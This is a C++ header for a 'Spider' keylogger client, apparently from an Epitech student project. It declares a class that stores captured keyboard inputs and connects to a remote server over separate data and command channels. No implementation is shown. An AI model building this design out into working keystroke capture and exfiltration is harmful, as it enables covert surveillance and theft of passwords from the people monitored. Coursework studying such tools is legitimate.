//
//	Created by hugo.baladssin@epitech.eu on 27/09/17
//

#ifndef		KEYLOGGER_H_
# define	KEYLOGGER_H_

# include <windows.h>
# include <sstream>
# include <string>
# include <fstream>
# include <list>

# include "input_struct.h"
# include "Parser.h"
# include "Communicator.h"

namespace spider
{
	namespace client
	{
		class		Keylogger {
		public:
			Keylogger() {}

			void					init();
			std::vector<t_input>&		getInputs();
			void					connectToServer();
			bool					reconnectToServer();
			bool					pingServer();

			void					initDataCommunicator();
			void					stopDataCommunicator();
			void					initCmdCommunicator();
			void					stopCmdCommunicator();
			Parser					parser;
			Communicator			*data_communicator;
			Communicator			*cmd_communicator;

		private:
			std::vector<t_input>		inputs;
		};
	};
};

extern	spider::client::Keylogger keylog;

#endif		/* !KEYLOGGER_H_ */